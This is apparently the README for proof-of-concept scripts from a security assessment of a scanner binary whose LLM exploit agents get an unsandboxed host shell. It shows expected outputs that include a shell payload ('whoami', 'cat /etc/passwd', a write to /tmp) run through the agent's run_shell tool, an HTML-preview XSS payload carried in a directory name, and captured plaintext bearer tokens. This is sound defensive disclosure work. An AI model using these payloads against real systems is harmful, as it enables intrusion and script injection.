# Running the PoCs

These scripts reproduce the findings in `../signal-pyarmor-linux-x86_64-vapt.md`
against `signal-pyarmor-linux-x86_64` (Black Duck Signal 2026.9.0).

Every command and every "expected output" below was executed end-to-end from a
clean directory while writing this file. `$WORK` is a scratch directory of your
choosing (`/tmp/vapt` was used for the assessment); nothing is hard-coded to it
except the default paths noted in the table in step 6.

## Quick start

Everything in steps 1–5 is automated. With the binary at hand:

```bash
bash poc/00-setup.sh --binary ~/Downloads/signal-pyarmor-linux-x86_64
```

It verifies the SHA-256, extracts the archive, removes the namespace markers,
builds the merged tree and the CPython host, runs the smoke test, and prints the
exact environment exports for the rest of the session. Re-running it is safe.
Then the static PoCs are one command each, e.g.

```bash
./py313host poc/03-armored-module-survey.py     # 62/62 protected modules, no licence
```

The rest of this file explains each step, so you can run them by hand — or fix
one that failed.

---

There are **two kinds of script** and they need different interpreters:

| Kind | Interpreter | Why |
|---|---|---|
| Reads the extracted artefact only | your system `python3` (3.13 ideal) | `poc/11`, `12`, `13`, `07`, `01` |
| Imports the frozen 3.13 modules | `./py313host` (built in step 5) | the frozen `.pyc` files are CPython 3.13 bytecode and must run on the `libpython3.13` shipped inside the binary |

> **Keep the step-5 exports away from your system `python3`.** `PYTHONHOME` points
> at `$WORK/pyhome`, which stands in for the bundled **3.13** standard library. Set
> it in a shell whose `python3` is newer (3.14, or anything that is not 3.13) and
> the interpreter dies *before reading the script*:
>
> ```
> Fatal Python error: Failed to import encodings module
> ImportError: bad magic number in 'encodings': b'\xf3\r\r\n'
> ```
>
> That is CPython refusing its own stdlib, not a bug in the PoC. The exports exist
> for `./py313host`; scripts of the first kind above need a clean environment:
>
> ```bash
> env -u PYTHONHOME -u PYTHONPATH python3 poc/16-check-f08.py
> ```
>
> `poc/00-setup.sh` prints the same remedy as `alias py3='env -u PYTHONHOME -u PYTHONPATH python3'`.

`py313host` propagates its command line into the script's `sys.argv`, so every
script — including the argument-taking ones — can also be run through it. That
makes `./py313host` a universal fallback if your system Python is newer than the
3.13 the payload was built with:

```bash
./py313host poc/12-disassemble-pyc.py pockit/agents/shared_tools.pyc run_shell
```

---

## Which host can run this?

The artefact is a **Linux x86-64 ELF executable**. It is not a Windows program,
and no Python on Windows can make it one — its payload contains Linux `.so`
libraries and a Linux CPython 3.13 runtime that the host program `dlopen()`s.

| | Windows (native) | macOS (native) | Linux / WSL2 |
|---|---|---|---|
| Steps 2–3 — unpack and repair the archive | yes | yes | yes |
| `poc/01` merged tree | only with `MERGE_LINK` (see below) — and nothing can consume it | same | yes |
| `poc/11`, `poc/12` — read the extracted `.pyc` | yes, with **Python 3.13** | yes, with 3.13 | yes |
| `poc/03`–`06`, `09`, `10` — run product code | no | no | yes |
| `poc/07`, `13` + any real scan | no | no | yes |

**Recommended: run it under WSL2.** From an elevated PowerShell:

```powershell
wsl --install -d Ubuntu          # then start Ubuntu once and set a UNIX user
```

Inside Ubuntu, work in the **Linux** filesystem, not under `/mnt/c` — the Windows
drives are mounted through 9p, which does not preserve the executable bit and is
slow for a 460 MB extraction:

```bash
sudo apt-get update && sudo apt-get install -y python3 python3-venv gcc libc6-dev openssl
mkdir -p ~/vapt && cd ~/vapt     # clone the repo here too, or copy poc/ in
```

Then follow this document from step 1. Nothing else changes. If your distribution
ships **Python 3.14** (Kali rolling does as of late 2026) nothing breaks — the
extractor runs fine on it — but two scripts were only tested on 3.11/3.13. If
`poc/11` or `poc/12` raises `ValueError: bad marshal data`, run them through the
host instead, which is always the payload's own 3.13:

```bash
./py313host poc/11-analyse-pockit-endpoint.py        # needs the step 5 exports
./py313host poc/12-disassemble-pyc.py pockit/agents/shared_tools.pyc run_shell
```

**If you must stay on Windows**, the useful subset is steps 2–3 plus the two
scripts that only read files — `poc/11` (PoCKit's endpoint and credential
constants, F-15) and `poc/12` (bytecode of a plain `.pyc`, F-01/F-02) — with
**Python 3.13.x**, because the payload is 3.13 bytecode and a 3.14 interpreter
may not unmarshal it:

```powershell
py -3.13 poc\11-analyse-pockit-endpoint.py C:\path\to\signal-pyarmor-linux-x86_64_extracted
py -3.13 poc\12-disassemble-pyc.py pockit\agents\shared_tools.pyc run_shell
```

Neither script imports product code, so you do **not** need `poc/01`, `poc/02`
or the merged tree for them. Skip steps 4–5 entirely.

Two Windows-specific notes for step 3 and `poc/01`:

* Do not leave paths at the `/tmp/vapt/…` defaults on Windows — an absolute
  POSIX path silently becomes `\tmp\vapt\…` on the current drive. Either pass
  the extraction as an argument (`py -3.13 poc\01-build-merged-tree.py C:\path\to\extracted`)
  or set `SIGNAL_EXTRACT`/`MERGED_OUT` to real Windows paths. `poc/01` now
  locates the extraction itself, creates any missing parent directories, and
  says so plainly when it cannot find it.
* `os.symlink` on Windows requires Developer Mode or elevation. `poc/01` tries
  symlink → hard link → copy and says which it used, so on NTFS either set
  `MERGE_LINK=hardlink` (no privileges needed, no extra disk) or accept
  `MERGE_LINK=copy` (about 408 MB). Both were verified to produce a tree that
  behaves identically.

---

## 0. Prerequisites

```bash
sudo apt-get install -y git python3 python3-venv gcc libc6-dev openssl   # Debian/Ubuntu
```

About 1.5 GB of free disk: the binary is 116 MB, the extraction 460 MB, and the
merged tree is made of links (almost free — see `MERGE_LINK` in step 4 if your
filesystem refuses them).

Steps 2–5 are the same five commands every time, so they are also scripted:

```bash
bash poc/00-setup.sh --binary ./signal-pyarmor-linux-x86_64 --work /tmp/vapt
```

It is idempotent — it skips an extraction that exists, re-checks the hash, and
re-runs the smoke test at the end. The rest of this section shows what it does,
so you can run or repair the steps individually.

Once that has succeeded, the whole offline suite is one command:

```bash
bash poc/run-static.sh            # --work <dir> if the extraction is elsewhere
```

```
  ok   03-armored-module-survey   F-03 F-14    imported successfully     : 62
  ok   04-protected-metadata      F-03         total harvested entries: 14344
  ok   05-poc-f01-host-shell      F-01         [+] host file /tmp/pockit-poc-escape-proof created: True
  ok   06-poc-f02-workspace       F-02         type=dir mode=0o755 …
  ok   08-runtime-versions        F-04 F-09    ssl           : OpenSSL 3.0.16 11 Feb 2025
  ok   09-advisory-ranges         F-11 F-12    bundled components inside a published affected range: 6
  ok   10-introspect-module       F-03         classes    : 22
  ok   11-pockit-endpoint         F-15         … https://llm.labs.blackduck.com …
  ok   12-disassemble-pyc         F-01 F-02    ### shared_tools.pyc.run_shell
```

It sets up its own environment, so it needs none of the exports from step 6, and
it exits non-zero if any PoC fails. The four findings that need the real binary
and a listening endpoint (F-05, F-06, F-15, F-16) are listed at the end of its
output and covered below.

### Everything, in one command

`poc/run-static.sh` stops at the offline PoCs. `poc/run-all.sh` runs those plus
the four that need the real binary and a listening endpoint, in one serial pass,
starting and stopping every listener itself:

```bash
bash poc/run-all.sh                              # work dir + binary autodetected
bash poc/run-all.sh --skip-dynamic               # offline PoCs only
bash poc/run-all.sh --work ~/VAPT --binary ~/VAPT/poc/signal-pyarmor-linux-x86_64
```

Verified on 16 October 2026 in a fresh clone of this repository, binary in
`poc/`, tokenizer cache pre-seeded (see *The tokenizer dependency* below):

```
  ok    setup   extraction, merged tree and host are in /tmp/allrun4/VAPT
  ok    F-01…15 the nine offline PoCs reproduced
  ok    F-05    tokenizer cache ready at /tmp/allrun4/VAPT/tkcache/cached
  ok    F-05    with an empty cache the run cannot proceed: embedding agents fail with '…blob.core.windows.net/encodings/cl100k_base.tiktoken'
  ok    F-15    with no docker binary the PoCKit hand-off refuses outright
  ok    F-15    a 3-line stub named 'docker' satisfies the gate (1 stub invocation(s) logged)
  ok    F-15    a config-file key is not passed through: PoCKit demands ANTHROPIC_API_KEY
  ok    F-15    the same config with --llm-key proceeds, and PoCKit sends that key to POST /v1/v1/messages?beta=true
  ok    F-16    the planted credential literal appears in 2 of 23 captured prompts (Identified 1 files for analysis) — no redaction
  ok    F-16    a git-ignored directory reports 'Identified 0 files for analysis' although it holds .py files — ignored code is never analysed
  ok    F-06    verify=true: 0 requests reached it; verify=false: 7, carrying Bearer CANARY_KEY_123
  reproduced: 11   failed: 0   skipped: 0
```

It exits non-zero if any check fails, and a failing run repeats every failed
check under `failed checks:` so the tail of the output always says what broke.
Every run is also kept in full as `<work>/poc-run.log`. It writes the raw
evidence for each phase into the work directory (`poc-f05.out`, `poc-f15a…d.out`,
`poc-f16-capture.log`, `poc-f06-requests.log`, `poc-docker-stub.log`). Phase 3 is
the only step that wants network access — it fetches the tiktoken tokenizer. It
judges success by the cache file itself (present, non-empty, and — where
`sha256sum` exists — matching the pinned digest), not by the seeder's exit code,
so a fresh fetch and an already-seeded cache both count. If the fetch is blocked
the phase fails, reports that it **is** F-05, skips phases 4–7 and exits 1;
pre-seed `tkcache/cached` (below) to run the rest offline. Phase
5 first runs with the host's own `PATH`, and where that `PATH` contains a
`docker`, it re-runs the stage against a mirror of your `PATH` with every docker
entry removed — the gate is a lookup, so the refusal is demonstrable either way
and the stage only skips if even that does not reproduce it.

### Just F-01 — the host shell

> `14`, `15` and `19` need the reconstructed interpreter. You no longer have to
> set anything up for them: each one finds `py313host` next to the checkout (or
> under `$WORK`, or `/tmp/vapt`) and re-executes itself there, so plain
> `python3 poc/14-check-f01.py` is enough. `poc/_host.py` does the lookup.
> `$WORK` exists only in the shell that ran `poc/00-setup.sh`, which is why a
> bare `$WORK/...` command fails with "no such file or directory: /py313host".


One script checks the whole chain of F-01 and nothing else:

```bash
export PYTHONHOME=$WORK/pyhome
export PYTHONPATH=$WORK/merged:$WORK/signal-pyarmor-linux-x86_64_extracted/base_library.zip
$WORK/py313host poc/14-check-f01.py
```

Three links, checked separately; exit code 0 only if all three hold:

```
== A. wiring: which shipped agents ask for a shell tool ==
   environment_setup_agent.pyc        kwargs=('workspace_dir', 'source_code_path', 'shell')  consts=[True]
                                                   -> shell=True
   exploit_agent.pyc                  kwargs=('workspace_dir', 'source_code_path', 'shell')  consts=[True]
                                                   -> shell=True
   fix_verification_agent.pyc         kwargs=('workspace_dir', ..., 'shell', 'write')  consts=[True, True]
                                                   -> shell=True, write=True
   research_agent.pyc                 kwargs=('workspace_dir', 'source_code_path')  consts=[]
                                                   -> (file tools only)
   validate_exploit_agent.pyc         kwargs=('workspace_dir', 'source_code_path')  consts=[]
                                                   -> (file tools only)
   PASS - 3 agent(s) register the shell tool

== B. implementation: what run_shell calls ==
   kwargs    : ('shell', 'capture_output', 'text', 'timeout', 'cwd')
   constants : [True, True, True, 120]   (and cwd, computed as str(workspace_dir))
   call      : subprocess.run(command, shell=True, capture_output=True,
               text=True, timeout=120, cwd=str(workspace_dir))
   PASS

== C. execution: the shipped tool, on this host ==
   registered tools: ['file_search', 'list_directory', 'read_file', 'run_shell', 'write_file']
   payload  : echo '=== whoami ==='; whoami; echo '=== pwd ==='; pwd; echo '=== cat /etc/passwd ===';
              cat /etc/passwd; echo '=== shell metacharacters ==='; printf 'A%s' 'B'; echo $((6*7));
              echo POC > /tmp/pockit-f01-<pid>.proof

   --- tool output (what the agent receives) ---
   | === whoami ===
   | user
   | === pwd ===
   | /tmp/pockit-f01-workspace
   | === cat /etc/passwd ===
   | root:x:0:0:root:/root:/bin/bash
   | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   | ... 23 more account lines ...
   | === shell metacharacters ===
   | AB42
   --- end ---
   PASS shell ran as this process's user (whoami == user)
   PASS cat /etc/passwd returned the file: 25 lines, identical to what this script read
   PASS metacharacters interpreted (printf format + $(()) arithmetic)
   PASS working directory is the PoCKit workspace (pwd == /tmp/pockit-f01-workspace)
   PASS file written outside the workspace
   PASS redirect landed on /tmp, not inside the workspace
   PASS written by this process's uid

== summary ==
   PASS wiring
   PASS implementation
   PASS execution
   F-01 reproduced: 3/3
```

The payload is the classic pair a tester reaches for: `whoami`, then
`cat /etc/passwd`. Both are read-only and harmless - `/etc/passwd` is
world-readable and on a modern system carries no credential material (the
hashes live in `/etc/shadow`, which nothing here touches). The script does not
merely display the output: it reads `/etc/passwd` and the current username
itself, without going through the shell, and asserts that the tool returned the
same 25 lines and the same account name.

The shell semantics are the rest of the proof. With `shell=False` the whole
string would be looked up as one executable named `echo '=== whoami ==='; ...`
and fail, and neither `printf`'s `%s` nor `$((6*7))` would be substituted.
Instead `AB42` comes back, `pwd` reports the PoCKit workspace, and the redirect
lands on `/tmp` - outside that workspace, as this process's own uid. The script
deletes the marker file when it is done.

It runs shipped product code, like `poc/05`; read both before running them.
`poc/05` is the same execution check with more commentary, `poc/12` is the
disassembler if you want to read the bytecode yourself.

### Just F-04 — the bundled TLS stack

```bash
export PYTHONHOME=$WORK/pyhome
export PYTHONPATH=$WORK/merged:$WORK/signal-pyarmor-linux-x86_64_extracted/base_library.zip
$WORK/py313host poc/15-check-f04.py
```

Three claims, checked separately; exit code 0 only if all three hold:

```
== A. what ships: every OpenSSL build in the archive ==
   libpython3.13.so.1.0                                 OpenSSL 3.0.16 11 Feb 2025
   psycopg2_binary.libs/libcrypto-2e26a48f.so.3         OpenSSL 3.5.4 30 Sep 2025
   PASS - the interpreter's TLS stack is statically linked inside libpython3.13.so.1.0: 3.0.16
   PASS - a second, independent build ships in psycopg2_binary.libs/…: 3.5.4 (psycopg2 / --cache-database only)

== B. what runs: the bundled interpreter's own ssl module ==
   interpreter: Python 3.13.5
   ssl        : OpenSSL 3.0.16 11 Feb 2025
   PASS - the running interpreter reports the version found in the archive
   PASS TLS default: verify_mode = CERT_REQUIRED
   PASS TLS default: check_hostname = True
   PASS TLS default: minimum_version >= TLS 1.2

== C. advisories: shipped versions vs the fixed-version boundaries ==
   shipped 3.0.x: 3.0.16   newest 3.0.x at assessment time: 3.0.21   -> 5 patch release(s) behind
   CVE-2025-15467  High      3.0.19      IN RANGE    3.5.5 in range
   CVE-2025-9230   Moderate  3.0.18      IN RANGE    3.5.4 fixed
   …
   PASS 7 of 7 advisories list 3.0.16 inside their affected range
   PASS 3.0.16 is behind 3.0.21 (5 patch releases)

   F-04 reproduced: 3/3
```

Check B refuses to co-operate if you run it with your own Python instead of
`py313host` — it compares what `ssl` reports against the banner in the archive
and stops with "this script is not running under the reconstructed host" rather
than attributing your system OpenSSL to the bundle.

**What this proves and what it does not.** It proves the version and the patch
gap: the TLS stack every HTTPS request uses is 3.0.16, five patch releases
behind, and each advisory in the report's table has its fixed-version boundary
above it, so the whole backlog ships with the tool. It does **not** prove that
any of those CVEs is reachable: the High-severity items are in CMS, PKCS#12 and
PKCS#7 parsing, Python's `ssl` module exposes TLS only, and the CLI does not
parse those formats through it. No CVE proof-of-concept is included or implied —
the report scores F-04 Medium (5.6) for exactly that reason. Note also the
contrast the check surfaces on a current host: your own system OpenSSL is
usually *newer* than the one shipped in the binary.

The advisory table ages faster than the binary: `LATEST_30` and `ADVISORIES`
at the top of the script are a snapshot of 2026-10-16 and should be refreshed
before the numbers are quoted later.

### Just F-08 — build provenance and shipped development material

Nothing here needs the reconstructed host or any execution: F-08 is read
straight out of the distributed artefact. Any Python 3.8+ will do.

```bash
# reads the artefact only, so it runs on your system python3 - not py313host
python3 poc/16-check-f08.py                       # finds the artefacts itself
python3 poc/16-check-f08.py --binary /path/to/signal-pyarmor-linux-x86_64

# if this shell still has the step-5 exports for ./py313host, this form is
# always safe (see the note on interpreters above):
env -u PYTHONHOME -u PYTHONPATH python3 poc/16-check-f08.py
```

This is the one focus script that does **not** need `./py313host`: it imports
nothing from the product. It therefore must *not* inherit `PYTHONHOME`/`PYTHONPATH`
— with those set, a system Python newer than 3.13 aborts with `bad magic number in
'encodings'` before the script starts.

```
== A. provenance: where and how the release was built ==
   signal-2026.9.0        file:///builds/siglab/noscan  (editable=True)
   pockit-0.1.52          file:///builds/siglab/noscan/extensions/pockit-0.1.52-py3-none-any.whl  (editable=None)
   PASS - direct_url.json exposes an absolute build-host checkout path
   PASS - the install is recorded as editable (built from a source tree, not a package)
   PASS - uv_cache.json build timestamp: 1789075955 (2026-09-10T21:32:35Z)
   PASS - PyArmor banner in shipped sources: # Pyarmor 9.2.2 (ci), 008246, BlackDuckSignal, 2026-09-10T21:32:15

== B. toolchain: what built the binary (ELF .comment) ==
   .comment: GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
   compiler: GCC 7.5.0   distro: Ubuntu 18.04   (standard support ended April 2023)
   PASS - the executable discloses the toolchain that produced it
   NOTE - .text is byte-identical to PyInstaller 6.20.0's stock Linux
          bootloader, which upstream builds in an ubuntu:18.04 container:
          the stamp describes that bootloader, not your own build image

== C. development material shipped in the release ==
   tests/ tree      : 79 files (4.9 MB), 79 carry a PyArmor banner
   PASS - test suite ships at all: 79 files
   PASS - every shipped test is itself obfuscated (79/79)
   PASS - an internal 'leak scan' helper is part of the shipped tree: tests/integration/_leak_scan.py
   dist-info records: 26 (report records 26)
   platform runtimes: darwin_aarch64, darwin_x86_64, linux_aarch64, linux_x86_64, windows_x86_64
   PASS - 4 foreign-platform runtime(s) in a linux_x86_64 build, 2.7 MB unused
   PASS - declared runtime dependency 'pip-audit==2.10.0' - build tool, module not collected
   PASS - declared runtime dependency 'pyarmor-cli-core-darwin==8.1.0' - build tool, module not collected
   PASS - declared runtime dependency 'pyarmor-cli-core-linux==8.1.0' - build tool, module not collected
   PASS - declared runtime dependency 'pyarmor-cli-core-windows==8.1.0' - build tool, module not collected
   NOTE - pockit>=0.1.4 is a hard runtime dependency (an autonomous exploit harness)

   F-08 reproduced: 3/3
```

The `.comment` section is parsed by the script itself (a small ELF section-header
reader, ~40 lines), so no `readelf`/`binutils` is required — `readelf -p .comment
signal-pyarmor-linux-x86_64` gives the same one line if you prefer the tool.

**What this proves and what it does not.** It proves the release carries the
build host's checkout path and its editable-install flag, the build timestamp,
the compiler and distribution behind its bootloader, the complete obfuscated
test tree, unused platform runtimes and build-only tools declared as runtime
dependencies — all readable without executing anything. It does **not** prove an
exploitable defect: this is information exposure and artefact hygiene, which is
why the report scores it Low (3.7). Two details are worth noting because they
show how much builds differ in what they leak: the internal path appears in
*two* records (the product and its `pockit` dependency), and the shipped test
tree is 4.9 MB — larger than many of the product's own modules.

### Just the transport — is the LLM traffic encrypted?

`poc/17-check-plaintext.py` stands up a **plain HTTP** listener, points the tool
at it with `uri = http://<addr>:<port>/v1`, and records what arrives. It needs no
tokenizer cache and no Docker: `--check-llm-json true` probes the LLM layer
directly.

```bash
python3 poc/17-check-plaintext.py
python3 poc/17-check-plaintext.py --binary /path/to/signal-pyarmor-linux-x86_64
```

```
plaintext transport check - LLM traffic over http://
binary    : /home/user/VAPT/signal-pyarmor-linux-x86_64
endpoint  : http://169.254.0.21:33003/v1
listener  : 0.0.0.0:33003 (non-loopback address available)

== A. a cleartext http:// endpoint is accepted ==
   requests received: 5
   PASS - the tool connected to a plain HTTP endpoint (5 request(s))

== B. the bearer credential crosses the wire unencrypted ==
   seen: Bearer CANARY_PLAINTEXT_9f31c2
   PASS - Authorization: Bearer <canary> arrived over the plaintext socket
   PASS - request line is cleartext HTTP ('POST /v1/chat/completions HTTP/1.1'), so no TLS handshake preceded it

== C. nothing warns the operator ==
   PASS - no insecure-transport warning or refusal in the output
   PASS - the run actually reached the LLM layer (not a config error)

   plaintext transport reproduced: 3/3
```

The listener binds `0.0.0.0` and the tool is aimed at the host's non-loopback
address when there is one, so this is not a loopback-only artefact. The scheme is
never validated: `http://` is accepted from `.signal` **and** from `--llm-uri`,
for any host, and the bearer token goes out in the clear.

**Packet-level capture (Wireshark).** Pin the port so the display filter is
`tcp port 8899`, capture on `lo`, and open the pcap:

```bash
sudo tcpdump -i lo -s0 -U -w /tmp/plaintext.pcap 'tcp port 8899'
env -u PYTHONHOME -u PYTHONPATH python3 poc/17-check-plaintext.py --host 127.0.0.1 --port 8899
wireshark /tmp/plaintext.pcap        # Decode As -> HTTP on port 8899
```

`./poc/capture-plaintext.sh` automates those three steps and prints the decoded
`Authorization` headers. Step-by-step, including the WSL specifics (Windows
Wireshark cannot see WSL's loopback) and the "Decode As → HTTP" gotcha:
**`poc/captures/README.md`**.

**Application-level capture.** Add `--capture <file>` to save every request
exactly as it arrived on the socket (headers in wire order, body, byte count and
sha256 of the raw bytes, plus the config that produced it):

```bash
python3 poc/17-check-plaintext.py --capture poc/captures/17-plaintext-capture.txt
```

A committed example is at **`poc/captures/17-plaintext-capture.txt`** — five
requests from five agents, each carrying `Authorization: Bearer <canary>` and a
plain HTTP request line, with no TLS record anywhere in the stream. The capture is
from `--check-llm` probes, so the bodies are a fixed `"Hello"`; the config block
at the top of the file shows exactly what was run.

**What this proves and what it does not.** It proves the credential is
transmitted unencrypted whenever an `http://` endpoint is configured, and that
nothing warns the operator. It does **not** show the source-code payloads: the
`--check-llm` probe carries a fixed `"Hello"` prompt, and a full scan needs the
tokenizer cache first (F-05). The same client and endpoint carry those payloads —
that is the point of the finding — but this check does not re-demonstrate it.

The default endpoint is HTTPS, so the exposure needs an `http://` endpoint to be
configured — deliberately, through a shared `.signal`, or by an internal gateway.
That is exactly the problem: transport security is optional and silent, in the
same class as `--llm-ssl-verify false` (F-06), but a different defect — that one
weakens TLS, this one removes it.

### Just loading — native code, privilege and the packager

`poc/18-check-loading.py` answers the "DLL hijacking" question with measurements
instead of assumptions: loader search path, setuid/capabilities, the mode of the
directory PyInstaller extracts into, whether `_PYI_*` spoofing redirects it, and
which PyInstaller version is embedded.

```bash
python3 poc/18-check-loading.py
```

```
NEEDED   : libdl.so.2, libz.so.1, libpthread.so.0, libc.so.6
RPATH    : (none)      RUNPATH : (none)
mode     : 0o755  owner uid 1001        caps : (none)
PASS - no RPATH/RUNPATH: libraries resolve through the system loader only
PASS - not setuid/setgid and carries no file capabilities
extraction: _MEIyeWkTv  mode 0o700  owner uid 1001
PASS - extraction dir is 0700 (owner-only, 0o700)
_PYI_APPLICATION_HOME_DIR  rc=0  unchanged
+ _PYI_ARCHIVE_FILE        rc=0  unchanged
+ parent level             rc=0  unchanged
PASS - spoofed _PYI_* variables do not redirect the loader in this build
bootloader   : stock PyInstaller 6.20.0
PASS - embedded PyInstaller 6.20.0 IS inside the affected range
    loading/privilege reproduced: 4/4
```

**The result is mostly a negative one, and that matters.** No RPATH, no setuid, no
capabilities, a `0700` extraction directory with a random name, and spoofed
`_PYI_*` variables that change nothing when the binary runs as an ordinary user —
so there is no classic library-planting path here.

The one issue is inherited from the packager: **PyInstaller 6.20.0** is inside
GHSA-9fxf-4qw3-ghmr (fixed in 6.22.1), which needs a **privileged** instance of
the executable (setuid/setgid) to matter. Rebuild with 6.22.1+ and never install
it setuid.

CA bundle note, checked at the same time: 150 roots ship, one of which expired on
2025-05-12. Expired roots are ignored by path building, so this is hygiene, not a
finding.

### Just the HTML preview — can untrusted results inject script?

`--result-preview true` writes a self-contained HTML report. This checks whether
values from the analysed material survive into that document as markup.

```bash
cd ~/VAPT
python3 poc/19-check-xss.py        # finds py313host itself and re-execs there
```

`utils/html_preview` lives inside the PyArmor archive, so it only imports on the
reconstructed host. The script locates `py313host` next to the checkout (or under
`$WORK`, or `/tmp/vapt`) and re-executes itself with the right `PYTHONHOME` and
`PYTHONPATH`, so no environment needs to be set.

If you prefer to do it by hand, set the variables explicitly — `$WORK` is only
defined in the shell that ran `poc/00-setup.sh`, and a placeholder like `...`
will not expand:

```bash
cd ~/VAPT
WORK=$PWD
PYTHONHOME=$WORK/pyhome \
PYTHONPATH=$WORK/merged:$WORK/signal-pyarmor-linux-x86_64_extracted/base_library.zip \
$WORK/py313host poc/19-check-xss.py
```

```
== A. control: a benign document ==
   document 16943 bytes, 1 script element(s)
   PASS - exactly one script element, as the template intends

== B. result message text ==
   payload : </script><script>window.__VAPT_PREVIEW_XSS__=1</script>
   document 16987 bytes, 2 script element(s)
     [0] 'const DATA = [{"rank": 0.0, "cls": null, ...'
     [1] 'window.__VAPT_PREVIEW_XSS__=1'
   PASS - the payload forms a SECOND script element
   PASS - that element's body is the attacker's JavaScript
   ...
   preview injection reproduced: 5/5
```

Five checks: a benign control, message text, `src_label`, artifact path, and
whether a repository can actually produce that path from legal components.

The generated document is kept at `poc/captures/19-preview-xss.html`. **Do not
open it in a browser** unless you want the payload to run — that is the finding.

The template has four substitution points — `const DATA = __DATA__;`,
`__CLASSES__`, and `<code>__SRC__</code>` — filled with `json.dumps(...)` and a
raw `src_label`. JSON escapes quotes but not `<`, so `</script>` ends the script
element. The artifact path is the interesting vector: a scanned repository
controls it, and `</script>` can be built from three legal path components
(`<`, `script><script>...<`, `script>`), so no SARIF import is needed.

## Reading the report

`signal-pyarmor-linux-x86_64-vapt.md` is Markdown — 1,530 lines, 8 tables. Any
Markdown viewer renders it. If you want something you can attach or read without
a preview pane:

```bash
./poc/build-report-html.sh          # -> signal-pyarmor-linux-x86_64-vapt.html
./poc/build-report-html.sh --open   # same, with the path printed last
```

The result is a single self-contained file — CSS embedded, no network, no
external assets — with dark-mode support and print rules. Open it by
double-clicking, or `xdg-open signal-pyarmor-linux-x86_64-vapt.html`.

To produce a PDF: open the HTML in a browser and use Print → Save as PDF. The
stylesheet already carries `@media print` rules (page-break hints on tables and
code blocks, URLs expanded after links).

`f08-client-brief.md` is a separate, shorter document for the client
conversation about F-08; build it the same way if you want it as HTML.

## Opening the preview the tool writes

This is the tool's own HTML report — not the assessment document above.

```bash
./signal-pyarmor-linux-x86_64 ./target \
  --prioritization true --result-preview true \
  --report-file results.sarif
```

`--help` describes it as a "self-contained HTML preview (rank/novelty/
exploitability, filterable)" written **alongside the SARIF report**, and it requires
`--prioritization` because it renders fields that stage produces. So the two files
land in the same directory, named after `--report-file`: with the default
`results.sarif`, the preview is `results.html`. (The CLI's naming code is inside
armoured modules, so the name could not be read out of the binary; the placement
is the part `--help` states. If your run produces a different name, it is the
`.html` file next to `results.sarif`.)

This is the document that carries **F-18**: the renderer substitutes the source
label and result fields into markup and into a script block without escaping.

A complete run is not possible in this sandbox — the scan aborts at the tokenizer
fetch before any report is written (F-05) — so the same document is produced
through the same shipped renderer:

```bash
python3 poc/20-make-preview.py
```

```
renderer : /tmp/vapt/merged/utils/html_preview.py
scanned  : /tmp/poc-preview-c_0qy3yq/</script><script>document.title='XSS';...
preview  : /home/user/VAPT/poc/captures/results.html (17361 bytes)
sarif    : /home/user/VAPT/poc/captures/results.sarif

script elements: 2 (1 payload, 1 other)
payload script : 226 bytes, intact
report data    : clean - the preview's own JS still parses
execution check: PASS {"title":"XSS","flag":1,"injected":1}
```

The payload rides in the **name of the scanned directory**, which becomes the
report's source label; nothing is imported. Open the committed artefact:

```bash
xdg-open poc/captures/results.html          # Linux
explorer.exe poc/captures/results.html      # WSL
```

A normally rendered preview (table, filters) plus a red **XSS EXECUTED** banner
and the title `XSS` mean the payload ran. That is the finding, not a bug in the
PoC.

**Do not open a preview produced from untrusted material in your normal browser
profile.** The file executes whatever the scanned repository put into it, and the
report contains the findings themselves. Use a throwaway profile or a container
with no network and no session.

## F-07 / CWE-214 — visible API key in process arguments

`--llm-key` (and the per-agent `--llm-<agent>-key`) accepts literal keys. Such a
key stays in `/proc/<pid>/cmdline` while Signal runs and may reach shell history
and CI logs. This host's `/proc` entry was `0444` and a separate unprivileged
account (`nobody`) read the canary. Other hosts can restrict process visibility
via their procfs policy. The application masks its own log; that does not remove
the key from argv.

Run the *single-command* PoC on Linux/WSL2 from the repository root:

```bash
env -u PYTHONHOME -u PYTHONPATH python3 poc/21-check-argv-keys.py
```

It finds the exact v1.0 binary locally or reconstructs it from **this repo's
`binary-drop` branch**, checks SHA-256, and needs no extraction, key, remote LLM,
or tokenizer download. It creates synthetic keys, drives a loopback-only endpoint,
and explains each PASS/FAIL in plain English: what appeared in the process list,
whether another local account read it, whether Signal actually used that key,
why log masking does not fix the leak, and which alternative works. **PASS means
an observation was verified, not that Signal is secure.** Example conclusion
from a host where the optional second-account check was available:

```text
F-07 reproduced: 4/4 (CWE-214)
CONCLUSION: Another local account could read the fake API key while Signal ran.
```

The second-account check needs a passwordless privilege drop; if unavailable, it
is explicitly skipped and the conclusion says that cross-user access was not
confirmed on that host. The main process-list check still runs.

The safer credential route is `--config` with a protected file. For example, the
`[LLM]` section of that file can contain `key = ${SIGNAL_LLM_SECRET}`: an exported
environment variable **is interpolated** there (five local Bearer requests with
the canary were observed), so the config need not contain the secret itself. Have
your secret manager set that variable. A `.env` file is **not loaded
automatically**; a `.env` carrying `LLM_KEY`, `SIGNAL_LLM_KEY`, or
`OPENAI_API_KEY` did not satisfy the tool's validation. If using `.env`, load it
into the environment explicitly and keep it outside source control. Do not run
`--llm-key "$SIGNAL_LLM_SECRET"` — the shell would expand the secret into argv;
the generic `--llm-key '${SIGNAL_LLM_SECRET}'` was tested and sent the literal
placeholder rather than interpolating it. Signal does not enforce config-file
permissions: use mode `0600` if the file itself holds a key.

## 1. Obtain the target and verify it

The binary is stored in this repository as two parts on the `binary-drop` branch
and attached to release `v1.0`. Either source works.

```bash
export WORK=/tmp/vapt && mkdir -p "$WORK" && cd "$WORK"

# (a) pull the two parts out of the repository
#     the explicit refspec matters: a bare `git fetch origin binary-drop`
#     leaves only FETCH_HEAD, not a tracking ref for `git show`
git -C /path/to/VAPT fetch origin binary-drop:refs/remotes/origin/binary-drop
git -C /path/to/VAPT show origin/binary-drop:signal-pyarmor-linux-x86_64.part-00 > part-00
git -C /path/to/VAPT show origin/binary-drop:signal-pyarmor-linux-x86_64.part-01 > part-01

# (b) or take the release asset, in which case skip the `cat` below
# gh release download v1.0 --pattern signal-pyarmor-linux-x86_64

cat part-00 part-01 > signal-pyarmor-linux-x86_64      # part-00 first
chmod +x signal-pyarmor-linux-x86_64

stat -c%s signal-pyarmor-linux-x86_64
# 116823456
sha256sum signal-pyarmor-linux-x86_64
# 47b9fa7236a5be5ed37a9186d55a6a84b8d2ef65fd0ab9e2fa744b0641c7d915
```

**Stop here if the hash does not match** — every result below depends on it.

